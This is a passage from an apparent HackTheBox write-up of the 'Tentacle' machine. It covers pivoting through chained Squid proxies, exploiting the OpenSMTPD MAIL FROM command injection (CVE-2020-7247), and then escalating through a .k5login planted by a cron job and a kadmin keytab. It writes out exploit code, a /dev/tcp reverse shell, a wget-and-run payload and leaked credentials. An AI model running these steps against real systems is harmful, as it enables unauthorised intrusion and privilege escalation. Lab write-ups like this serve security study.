```

However, trying it with the domain name returns a 403:

```

oxdf@parrot$ proxychains -f proxy-squid-x3.conf curl http://wpad.realcorp.htb/ 
[proxychains] config file found: proxy-squid-x3.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:3128  ...  10.197.243.77:3128  ...  wpad.realcorp.htb:80  ...  OK
<html>
<head><title>403 Forbidden</title></head>
<body bgcolor="white">
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx/1.14.1</center>
</body>
</html>

```

So there’s virtual host routing enabled on the WPAD server. I could `wfuzz` or `fuff` to find additional subdomains, but I won’t need to. I don’t need to worry about resolving `wpad.realcorp.htb` (like putting it in `/etc/hosts`) as that’s done at the internal proxy server that’s sending the actual HTTP request.

There is a `wpad.dat` file in the web root:

```

oxdf@parrot$ proxychains -f proxy-squid-x3.conf curl http://wpad.realcorp.htb/wpad.dat
[proxychains] config file found: proxy-squid-x3.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:3128  ...  10.197.243.77:3128  ...  wpad.realcorp.htb:80  ...  OK
function FindProxyForURL(url, host) {
    if (dnsDomainIs(host, "realcorp.htb"))
        return "DIRECT";
    if (isInNet(dnsResolve(host), "10.197.243.0", "255.255.255.0"))
        return "DIRECT"; 
    if (isInNet(dnsResolve(host), "10.241.251.0", "255.255.255.0"))
        return "DIRECT"; 
 
    return "PROXY proxy.realcorp.htb:3128";

```

### 10.241.251.0/24

I’ll try the same DNS tricks from above to look for hosts in the new class-C. `nmap` finds one:

```

oxdf@parrot$ nmap -sL --dns-servers 10.10.10.224 10.241.251.0/24 | grep -F '('
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-08 17:09 EDT
Nmap scan report for srvpod01.realcorp.htb (10.241.251.113)
Nmap done: 256 IP addresses (0 hosts up) scanned in 0.11 seconds

```

`dig` finds the same host:

```

oxdf@parrot$ for i in {1..254}; do dig +noall +answer @10.10.10.224 -x 10.241.251.$i; done
113.251.241.10.in-addr.arpa. 259200 IN  PTR     srvpod01.realcorp.htb.

```

### srvpod01.realcorp.htb - nmap

Both the one hop and two hop `proxychains` configs don’t return anything, but the three hop config finds a single open port (in the top 1000):

```

oxdf@parrot$ sudo proxychains -q -f proxy-squid-x3.conf nmap --top-ports 1000 -sT -Pn 10.241.251.113
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-08 17:13 EDT
Nmap scan report for 10.241.251.113
Host is up (0.091s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
25/tcp open  smtp

Nmap done: 1 IP address (1 host up) scanned in 92.77 seconds

```

Safe scripts and version scans show it’s running OpenSMTPD:

```

oxdf@parrot$ sudo proxychains -q -f proxy-squid-x3.conf nmap -p 25 -sCV -sT -Pn 10.241.251.113
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-08 17:21 EDT
Nmap scan report for 10.241.251.113
Host is up (0.087s latency).

PORT   STATE SERVICE VERSION
25/tcp open  smtp    OpenSMTPD
| smtp-commands: smtp.realcorp.htb Hello nmap.scanme.org [10.241.251.1], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP, 
|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info 
Service Info: Host: smtp.realcorp.htb

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.27 seconds

```

## Shell as root on smtp

### Exploit

Googling for “opensmtpd exploit” returns a remote code execution exploit from [Exploit-DB](https://www.exploit-db.com/exploits/47984), CVE-2020-7247. It’s a Python script, but looking at it, it looks like a simple command injection in the `MAIL FROM` line. It connects to the server, and then reads the Hello string:

```

res = s.recv(1024)
if 'OpenSMTPD' not in str(res):
    print('[!] No OpenSMTPD detected')
    print('[!] Received {}'.format(str(res)))
    print('[!] Exiting...')
    sys.exit(1)

```

It sends a `HELO` response:

```

print('[*] OpenSMTPD detected')
s.send(b'HELO x\r\n')
res = s.recv(1024)
if '250' not in str(res):
    print('[!] Error connecting, expected 250')
    print('[!] Received: {}'.format(str(res)))
    print('[!] Exiting...')
    sys.exit(1)

```

It sends the payload:

```

print('[*] Connected, sending payload')
s.send(bytes('MAIL FROM:<;{};>\r\n'.format(CMD), 'utf-8'))
res = s.recv(1024)
if '250' not in str(res):
    print('[!] Error sending payload, expected 250')
    print('[!] Received: {}'.format(str(res)))
    print('[!] Exiting...')
    sys.exit(1)

```

Then it sends the rest of the fields and exits:

```

print('[*] Payload sent')
s.send(b'RCPT TO:<root>\r\n')
s.recv(1024)
s.send(b'DATA\r\n')
s.recv(1024)
s.send(b'\r\nxxx\r\n.\r\n')
s.recv(1024)
s.send(b'QUIT\r\n')
s.recv(1024)
print('[*] Done')

```

### POC

#### Manual

To test this, I’ll use `nc` to try to `ping` my VM from the SMTP server. I’ll start `tcpdump` listening for ICMP, and then connect to the port:

```

oxdf@parrot$ sudo proxychains -f proxy-squid-x3.conf nc 10.241.251.113 25
[proxychains] config file found: proxy-squid-x3.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:3128  ...  10.197.243.77:3128  ...  10.241.251.113:25  ...  OK
220 smtp.realcorp.htb ESMTP OpenSMTPD

```

I’ll enter `HELO` and then the payload in the `MAIL FROM`:

```

HELO x
250 smtp.realcorp.htb Hello x [10.241.251.1], pleased to meet you
MAIL FROM:<;ping -c 1 10.10.14.7;> 
250 2.0.0 Ok

```

Next I need to enter the rest of the fields. But it fails on trying to send to root:

```

RCPT TO:<root>
550 Invalid recipient: <root@smtp.realcorp.htb>

```

Luckily I had an email address from the Squid pages:

```

RCPT TO:<j.nakazawa@realcorp.htb>
250 2.1.5 Destination address valid: Recipient ok

```

Now the data. The top blank line is important, and then whatever I want leading up to a line with just a `.`:

```

DATA
354 Enter mail, end with "." on a line by itself

0xdf was here
.
250 2.0.0 b555d48d Message accepted for delivery

```

When it prints “Message accepted for delivery”, ICMP packets arrive at `tcpdump`:

```

oxdf@parrot$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
17:40:26.629737 IP 10.10.10.224 > 10.10.14.7: ICMP echo request, id 21, seq 1, length 64
17:40:26.629760 IP 10.10.14.7 > 10.10.10.224: ICMP echo reply, id 21, seq 1, length 64

```

I’ll enter `QUIT` to exit:

```

QUIT
221 2.0.0 Bye

```

#### Script

To save myself the trouble of typing all that, I’ll grab the [exploit](https://www.exploit-db.com/download/47984) and replace `root` with `j.nakazawa@realcorp.htb`. It runs:

```

oxdf@parrot$ sudo proxychains -f proxy-squid-x3.conf python opensmtp-exploit.py 10.241.251.113 25 'ping -c 1 10.10.14.7'
\[proxychains] config file found: proxy-squid-x3.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:3128  ...  10.197.243.77:3128  ...  10.241.251.113:25  ...  OK
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done

```

And produces the same result:

```

17:51:41.139562 IP 10.10.10.224 > 10.10.14.7: ICMP echo request, id 31, seq 1, length 64
17:51:41.139584 IP 10.10.14.7 > 10.10.10.224: ICMP echo reply, id 31, seq 1, length 64

```

### Shell

After futzing with different reverse shells for a while, I went back to just requesting a shell and then passing it to Bash. `curl` didn’t reach back to my host, but `wget` did. I wrote a simple `shell.sh`:

```

#!/bin/bash

bash -i >& /dev/tcp/10.10.14.7/443 0>&1

```

I’ll start a Python web server and `nc` on 443. Now `wget` will get it and save it in `/dev/shm`, and then run it:

```

oxdf@parrot$ sudo proxychains -f proxy-squid-x3.conf python opensmtp-exploit.py 10.241.251.113 25 'wget 10.10.14.7/shell.sh -O /dev/shm/.0xdf.sh; bash /dev/shm/.0xdf.sh'
[proxychains] config file found: proxy-squid-x3.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:3128  ...  10.197.243.77:3128  ...  10.241.251.113:25  ...  OK
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done

```

First there’s a request at the webserver:

```
10.10.10.224 - - [08/Jun/2021 17:57:01] "GET /shell.sh HTTP/1.1" 200 -

```

Then a shell:

```

oxdf@parrot$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.224] 43642
bash: cannot set terminal process group (59): Inappropriate ioctl for device
bash: no job control in this shell
root@smtp:~#

```

Python isn’t installed on the box, but I can use `script`:

```

root@smtp:~# script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null 
root@smtp:~# ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@parrot$ stty raw -echo ; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
root@smtp:~# 

```

## Shell as j.nakazawa on srv01

### Enumeration

I’m already root on this host, but there isn’t anything interesting in `/root/`:

```

root@smtp:~# ls -la
total 8
drwx------. 1 root root 151 Jun  9 10:41 .
drwxr-xr-x. 1 root root  96 Dec  8  2020 ..
lrwxrwxrwx. 1 root root   9 Dec  9 12:32 .bash_history -> /dev/null
-rw-r--r--. 1 root root 570 Jan 31  2010 .bashrc
-rw-r--r--. 1 root root 148 Aug 17  2015 .profile
lrwxrwxrwx. 1 root root   9 Dec  9 12:32 .viminfo -> /dev/null

```

On this host, there’s one user, and not many files:

```

root@smtp:/home/j.nakazawa# find . -ls
find . -ls
 53833505      0 drwxr-xr-x   1 j.nakazawa j.nakazawa       59 Dec  9  2020 .
 51627972      0 lrwxrwxrwx   1 root       root              9 Dec  9  2020 ./.bash_history -> /dev/null
 53833507      4 -rw-r--r--   1 j.nakazawa j.nakazawa      220 Apr 18  2019 ./.bash_logout
 53833508      4 -rw-r--r--   1 j.nakazawa j.nakazawa     3526 Apr 18  2019 ./.bashrc
 53833509      4 -rw-r--r--   1 j.nakazawa j.nakazawa      807 Apr 18  2019 ./.profile
   358589      4 -rw-------   1 j.nakazawa j.nakazawa      476 Dec  8  2020 ./.msmtprc
   358586      0 lrwxrwxrwx   1 root       root              9 Dec  9  2020 ./.viminfo -> /dev/null

```

`.msmtprc` is the only unusual file. It’s a config file for a lightweight SMTP client, and can often include credentials. In this case, it does:

```

root@smtp:/home/j.nakazawa# cat .msmtprc
cat .msmtprc
# Set default values for all following accounts.
defaults
auth           on
tls            on
tls_trust_file /etc/ssl/certs/ca-certificates.crt
logfile        /dev/null

# RealCorp Mail
account        realcorp
host           127.0.0.1
port           587
from           j.nakazawa@realcorp.htb
user           j.nakazawa
password       sJB}RM>6Z~64_
tls_fingerprint C9:6A:B9:F6:0A:D4:9C:2B:B9:F6:44:1F:30:B8:5E:5A:D8:0D:A5:60

# Set a default account
account default : realcorp

```

### SSH Fails

I tried to SSH using those creds into the different hosts without success:

```

oxdf@parrot$ sshpass -p 'sJB}RM>6Z~64_' ssh j.nakazawa@10.10.10.224
Warning: Permanently added '10.10.10.224' (ECDSA) to the list of known hosts.
Permission denied, please try again.

oxdf@parrot$ sudo proxychains -f proxy-squid-x3.conf sshpass -p 'sJB}RM>6Z~64_' ssh j.nakazawa@10.197.243.77
[proxychains] config file found: proxy-squid-x3.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:3128  ...  10.197.243.77:3128  ...  10.197.243.77:22  ...  OK
Warning: Permanently added '10.197.243.77' (ECDSA) to the list of known hosts.
Permission denied, please try again.

oxdf@parrot$ sudo proxychains -f proxy-squid-x3.conf sshpass -p 'sJB}RM>6Z~64_' ssh j.nakazawa@10.197.243.31
[proxychains] config file found: proxy-squid-x3.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:3128  ...  10.197.243.77:3128  ...  10.197.243.31:22  ...  OK
Warning: Permanently added '10.197.243.31' (ECDSA) to the list of known hosts.
Permission denied, please try again.

```

### Kerberos Auth

Given how unusual it is to see Kerberos on Linux (at least on HTB), it’s worth poking at that. I’ll install a client, `sudo apt install krb5-user`.

The command to get a ticket is `kinit`. Running it with no args tries to get a ticket as `oxdf@ATHENA.MIT.EDU`:

```

oxdf@parrot$ kinit
kinit: Client 'oxdf@ATHENA.MIT.EDU' not found in Kerberos database while getting initial credentials

```

If I pass it a “principle name”, it’s still trying that domain, and giving the domain throws errors:

```

oxdf@parrot$ kinit j.nakazawa
kinit: Client 'j.nakazawa@ATHENA.MIT.EDU' not found in Kerberos database while getting initial credentials
oxdf@parrot$ kinit j.nakazawa@realcorp.htb
kinit: Cannot find KDC for realm "realcorp.htb" while getting initial credentials

```

I’ll need to update `/etc/krb5.conf`. The current default version is set up for MIT:

```

[libdefaults]
    default_realm = ATHENA.MIT.EDU
...[snip]...

```

I’ll delete the current file and replace it with:

```

[libdefaults]
  default_realm = REALCORP.HTB

[realms]
  REALCORP.HTB = {
    kdc = realcorp.htb:88
    }

```

Now when I do `kinit`, it prompts for a password:

```

oxdf@parrot$ kinit j.nakazawa
Password for j.nakazawa@REALCORP.HTB: 

```

On entering the password above, it just returns without message, which is good (entering a bad password throws an error). Running `klist` shows there’s a ticket on my system:

```

oxdf@parrot$ klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: j.nakazawa@REALCORP.HTB

Valid starting       Expires              Service principal
06/09/2021 07:29:18  06/10/2021 07:26:17  krbtgt/REALCORP.HTB@REALCORP.HTB

```

### SSH

Kerberos can be very picky about DNS names. I found that SSH would fail if I didn’t have `srv01.realcorp.htb` as the first host for the IP 10.10.10.224 (some troubleshooting with `-vv` on `ssh` helped me figure that out):

```
10.10.10.224 srv01.realcorp.htb realcorp.htb root.realcorp.htb

```

With that in place, I can SSH into the box using the Kerberos ticket:

```

oxdf@parrot$ ssh j.nakazawa@10.10.10.224
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Thu Jun 17 12:31:12 2021 from 10.10.14.7
[j.nakazawa@srv01 ~]$

```

Running that `ssh` with `-v`, it shows where it tries `gssapi-with-mic`, which is the method that uses Kerberos tickets to authenticate:

```

debug1: Authentications that can continue: gssapi-keyex,gssapi-with-mic,password
debug1: Next authentication method: gssapi-with-mic
debug1: Authentication succeeded (gssapi-with-mic).
Authenticated to 10.10.10.224 ([10.10.10.224]:22).

```

From this shell, I can grab `user.txt`:

```

[j.nakazawa@srv01 ~]$ cat user.txt
fb38d3f1************************

```

## Shell as admin on srv01

### Enumeration

There’s on additional user on this host, admin:

```

[j.nakazawa@srv01 ~]$ ls /home
admin  j.nakazawa

```

`/etc/crontab` shows an interesting job running as admin every minute:

```

[j.nakazawa@srv01 ~]$ cat /etc/crontab 
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed
* * * * * admin /usr/local/bin/log_backup.sh

```

The script is owned by root with the admin group

```

[j.nakazawa@srv01 ~]$ ls -l /usr/local/bin/log_backup.sh
-rwxr-xr--. 1 root admin 229 Dec  9 12:09 /usr/local/bin/log_backup.sh

```

The `.` at the end of the permissions means that it has an SELinux context, but no additional rules (ACLs), as `getfacl` shows in detail:

```

[j.nakazawa@srv01 ~]$ getfacl /usr/local/bin/log_backup.sh
getfacl: Removing leading '/' from absolute path names
# file: usr/local/bin/log_backup.sh
# owner: root
# group: admin
user::rwx
group::r-x
other::r--

```

j.nakazawa can read the script:

```

#!/bin/bash

/usr/bin/rsync -avz --no-perms --no-owner --no-group /var/log/squid/ /home/admin/
cd /home/admin
/usr/bin/tar czf squid_logs.tar.gz.`/usr/bin/date +%F-%H%M%S` access.log cache.log
/usr/bin/rm -f access.log cache.log

```

This script is using `rsync` to copy all the files from `/var/log/squid/` to `/home/admin/`, then create an archive using `tar`, and clean up.

### Abuse Kerberos

#### Background

An interesting feature of Kerberos on Linux is the `.k5login` file. This file in a user’s homedir lists different Kerberos principals (basically users) that can authenticate with their tickets to get access as the user. This is kind of like the `authorized_keys` file for Kerberos. So if admin had a `.k5login` file in their homedir with the name j.nakazawa in it, then anyone with a Kerberos ticket for j.nakazawa could SSH as admin.

#### Exploit

I can put that `.k5login` file in place abusing the backup script if I can write to `/var/log/squid`. It looks like only admin and members of the squid group can write:

```

[j.nakazawa@srv01 ~]$ ls -ld /var/log/squid/
drwx-wx---. 2 admin squid 41 Dec 24 06:36 /var/log/squid/

```

j.nakazawa is in the squid group:

```

[j.nakazawa@srv01 ~]$ id
uid=1000(j.nakazawa) gid=1000(j.nakazawa) groups=1000(j.nakazawa),23(squid),100(users) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

```

I’ll write a simple `.k5login` file:

```

[j.nakazawa@srv01 squid]$ echo "j.nakazawa@REALCORP.HTB" > /var/log/squid/.k5login

```

Once the next cron triggers, I can auth as admin using SSH:

```

oxdf@parrot$ ssh admin@10.10.10.224
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Thu Jun 17 14:15:01 2021
[admin@srv01 ~]$ 

```

## Shell as root

### Enumeration

I’ll use `find` to identify files in owned by the admin user:

```

[admin@srv01 ~]$ find / -user admin -type f 2>/dev/null | grep -Ev "^/sys|^/run|^/proc"
/var/spool/mail/admin
/home/admin/squid_logs.tar.gz.2021-06-10-012801

```

I’m using `grep` to get rid of things starting with `/sys`, `/run`, and `/proc` because those aren’t interesting. The logs archive is created by the cron (there must be something clearing those periodically). The mail file could be interesting, but it’s zero bytes:

```

[admin@srv01 ~]$ ls -l /var/spool/mail/admin
-rw-rw----. 1 admin mail 0 Dec  9  2020 /var/spool/mail/admin

```

The admin user is in the admin and squid groups:

```

[admin@srv01 ~]$ id
uid=1011(admin) gid=1011(admin) groups=1011(admin),23(squid) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

```

Doing the same thing to find files in associated with the admin group, there are two additional files:

```

[admin@srv01 ~]$ find / -group admin -type f 2>/dev/null | grep -Ev "^/sys|^/run|^/proc"
/etc/krb5.keytab
/usr/local/bin/log_backup.sh
/home/admin/squid_logs.tar.gz.2021-06-10-012801

```

I already knew about the `log_backup.sh` script. I’ll focus on `/etc/krb5.keytab`.

### Keytab File

The Keytab file is required on all Kerberos server machines, and is used to authenticate to the KDC. [The documentation](https://web.mit.edu/kerberos/krb5-1.5/krb5-1.5/doc/krb5-install/The-Keytab-File.html), after using two sentence two define the file, spends the next two talking about how important it is to protect:

> All Kerberos server machines need a keytab file, called `/etc/krb5.keytab`, to authenticate to the KDC. The keytab file is an encrypted, local, on-disk copy of the host’s key. The keytab file, like the stash file ([Create the Database](https://web.mit.edu/kerberos/krb5-1.5/krb5-1.5/doc/krb5-install/Create-the-Database.html)) is a potential point-of-entry for a break-in, and if compromised, would allow unrestricted access to its host. The keytab file should be readable only by root, and should exist only on the machine’s local disk. The file should not be part of any backup of the machine, unless access to the backup data is secured as tightly as access to the machine’s root password itself.

The file itself is binary, but `klist -k` will list the principles in the keytab file (I’m not sure why each shows up five times, but I have a guess from my work in [Beyond Root](#beyond-root---keytab-file-format)):

```

[admin@srv01 ~]$ klist -kt
Keytab name: FILE:/etc/krb5.keytab
KVNO Timestamp           Principal
---- ------------------- ------------------------------------------------------
   2 12/08/2020 22:15:30 host/srv01.realcorp.htb@REALCORP.HTB
   2 12/08/2020 22:15:30 host/srv01.realcorp.htb@REALCORP.HTB
   2 12/08/2020 22:15:30 host/srv01.realcorp.htb@REALCORP.HTB
   2 12/08/2020 22:15:30 host/srv01.realcorp.htb@REALCORP.HTB
   2 12/08/2020 22:15:30 host/srv01.realcorp.htb@REALCORP.HTB
   2 12/19/2020 06:00:42 kadmin/changepw@REALCORP.HTB
   2 12/19/2020 06:00:42 kadmin/changepw@REALCORP.HTB
   2 12/19/2020 06:00:42 kadmin/changepw@REALCORP.HTB
   2 12/19/2020 06:00:42 kadmin/changepw@REALCORP.HTB
   2 12/19/2020 06:00:42 kadmin/changepw@REALCORP.HTB
   2 12/19/2020 06:10:53 kadmin/admin@REALCORP.HTB
   2 12/19/2020 06:10:53 kadmin/admin@REALCORP.HTB
   2 12/19/2020 06:10:53 kadmin/admin@REALCORP.HTB
   2 12/19/2020 06:10:53 kadmin/admin@REALCORP.HTB
   2 12/19/2020 06:10:53 kadmin/admin@REALCORP.HTB

```

By default, a `krb5.keytab` file would only have the host principle. But another principle, kadmin, has been added here with both the `admin` and `changepw` privileges. That means that anyone who can read this file can act as kadmin, and that user can run the `kadmin` binary which allows them to administer the Kerberos domain. Running it will drop me to a `kadmin` prompt:

```

[admin@srv01 etc]$ kadmin -kt /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB
Couldn't open log file /var/log/kadmind.log: Permission denied
Authenticating as principal kadmin/admin@REALCORP.HTB with keytab /etc/krb5.keytab.
kadmin:

```

It’s important to specify that I’m getting auth through the keytab file, and that I want to enter as the kadmin principle with `admin` privs.

From within `kadmin`, I can list the users (principles) in the domain:

```

kadmin:  list_principals
K/M@REALCORP.HTB
host/srv01.realcorp.htb@REALCORP.HTB
j.nakazawa@REALCORP.HTB
kadmin/admin@REALCORP.HTB
kadmin/changepw@REALCORP.HTB
kadmin/srv01.realcorp.htb@REALCORP.HTB
kiprop/srv01.realcorp.htb@REALCORP.HTB
krbtgt/REALCORP.HTB@REALCORP.HTB

```

I can add root as a principle. When prompted, I enter a password (twice), and then root shows up:

```

kadmin:  add_principal root
No policy specified for root@REALCORP.HTB; defaulting to no policy
Enter password for principal "root@REALCORP.HTB": 
Re-enter password for principal "root@REALCORP.HTB": 
Principal "root@REALCORP.HTB" created.
kadmin:  list_principals
K/M@REALCORP.HTB
host/srv01.realcorp.htb@REALCORP.HTB
j.nakazawa@REALCORP.HTB
kadmin/admin@REALCORP.HTB
kadmin/changepw@REALCORP.HTB
kadmin/srv01.realcorp.htb@REALCORP.HTB
kiprop/srv01.realcorp.htb@REALCORP.HTB
krbtgt/REALCORP.HTB@REALCORP.HTB
root@REALCORP.HTB

```

Now `ksu` will run `su` using Kerberos, so I’ll enter the password I just created for root:

```

[admin@srv01 etc]$ ksu
WARNING: Your password may be exposed if you enter it here and are logged 
         in remotely using an unsecure (non-encrypted) channel. 
Kerberos password for root@REALCORP.HTB: : 
Authenticated root@REALCORP.HTB
Account root: authorization for root@REALCORP.HTB successful
Changing uid to root (0)
[root@srv01 etc]#

```

And grab `root.txt`:

```

[root@srv01 ~]# cat root.txt
5eac1728************************

```

The call to `kadmin` to then add a principal can be done in one line as well:

```

[admin@srv01 etc]$ kadmin -kt /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB -q "add_principal -pw 0xdf root"
Couldn't open log file /var/log/kadmind.log: Permission denied
Authenticating as principal kadmin/admin@REALCORP.HTB with keytab /etc/krb5.keytab.
No policy specified for root@REALCORP.HTB; defaulting to no policy
Principal "root@REALCORP.HTB" created.

```

## Beyond Root - KeyTab File Format

### Parsers

I looked for ways to dump hashes or passwords from the keytab file, but didn’t make much progress. I found [this tool](https://github.com/its-a-feature/KeytabParser), but it’s in legacy Python, and only gives one key:

```

oxdf@parrot$ python2 KeytabParser.py krb5.keytab 
17729
{
    "host/srv01.realcorp.htb@REALCORP.HTB": {
        "keys": [
            {
                "EncType": "aes256-cts-hmac-sha1-96", 
                "Key": "lZEBVb0fGSXKirqW4PvbDzeheaTAImsSuYIL4V4SLgE=", 
                "KeyLength": 32, 
                "Time": "2020-12-08 17:15:30"
            }
        ]
    }
}

```

[This one](https://github.com/sosdave/KeyTabExtract) is a bit nicer, and in Python3, but still only shows the host key:

```

oxdf@parrot$ python keytabextract.py krb5.keytab 
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : REALCORP.HTB
        SERVICE PRINCIPAL : host/srv01.realcorp.htb
        NTLM HASH : 771699676e1d3729e9ce6e278084a2e1
        AES-256 HASH : 95910155bd1f1925ca8aba96e0fbdb0f37a179a4c0226b12b9820be15e122e01
        AES-128 HASH : c62b475bf094d6f0045c477704adb49e

```

On diving into the binary format, I think I can explain why the parsers are stopping after the host.

### Binary Format

IppSec and I spent a bit of time trying to figure out the binary format, and [this reference](https://www.gnu.org/software/shishi/manual/html_node/The-Keytab-Binary-File-Format.html) proved to be the most useful (though not entirely complete).

The `keytab` is made up of a version and then some number of `keytab_entry`:

```

keytab {
    uint16_t file_format_version;                    /* 0x502 */
    keytab_entry entries[*];
};

```

Each `keytab_entry` starts with a four byte size. Looking at the file in `xxd` on my computer, that looks about right:

![](https://0xdfimages.gitlab.io/img/tentacle-keytab1.png)

I show each `keytab_entry` in a different color, after the version in red at the top. Each starts with a four byte size (0x5b, 0x4b, and 0x4d were observed above). There is an oddity at the end where the next `keytab_entry` would have a size of 0xffffffc3, which would be 4292967235 or -60. I’ll come back to those. After that size and a block of `00`, it continues with the expected format.

Looking at each `keytab_entry`, they have the following structure:

```

keytab_entry {
    int32_t size;
    uint16_t num_components;    /* sub 1 if version 0x501 */
    counted_octet_string realm;
    counted_octet_string components[num_components];
    uint32_t name_type;   /* not present if version 0x501 */
    uint32_t timestamp;
    uint8_t vno8;
    keyblock key;
    uint32_t vno; /* only present if >= 4 bytes left in entry */
};

```

Each block starts with a four byte size (blue), then a two byte number of components (yellow), which is always two. Then a `counted_octect_string` realm (pink), which is defined as:

```

counted_octet_string {
    uint16_t length;
    uint8_t data[length];
};

```

So each time there’s a string of data (I’d call it a buffer), it’s a two byte length and then the data. For any `counted_octet_string`, the `length` is in blue. Next come the components (green), each of which are `counted_octet_string`.

Next comes the four byte `name_type` (orange), which the docs say is practically always almost 1 for `KRB5_NT_PRINCIPAL`, and that’s the case here. Then a timestamp (purple), which is four bytes and number of seconds since 1/1/1970. So 0x5fcffb02 becomes 1607465730 which [translates](https://www.epochconverter.com/) to Tue, 08 Dec 2020 22:15:30 GMT (which matches the timestamp from `klist` above). The version number shows up as one byte next, and then again optionally at the end as four bytes (both white).

![](https://0xdfimages.gitlab.io/img/tentacle-keytab2-1623955871273.png)

What’s left is the `keyblock` objects. Each is a two byte type, and then another `counted_octect_string` (so len and then buffer). The first `keyblock` looks like:

![image-20210617145338860](https://0xdfimages.gitlab.io/img/image-20210617145338860.png)

This one is `keytype` 0x12 == 18 == aes256-cts-hmac-sha1-96. The other keytypes are 0x11 == 17 == aes128-cts-hmac-sha196, 0x17 == 23 == rc4-hmac (NTLM), etc. These are what came out of the parsing tool above.

Presumable we could try to crack these and get passwords for these principles.

The only thing I can’t explain at this point is the blocks of 0s proceeded by ffffc3 where the next length should be:

![](https://0xdfimages.gitlab.io/img/tentacle-keytab4.png)

Where there should be a length, there’s a negative sixty (0xffffffc3), followed by 0x3d (61) zeros. But if I allow that a length of -61 means jump forward 61 0s, I the rest of the file parses as expected. The parsing scripts don’t have anything in them to handle this, so they read this as a large number and exit. I suspect that’s why they don’t find all the keys.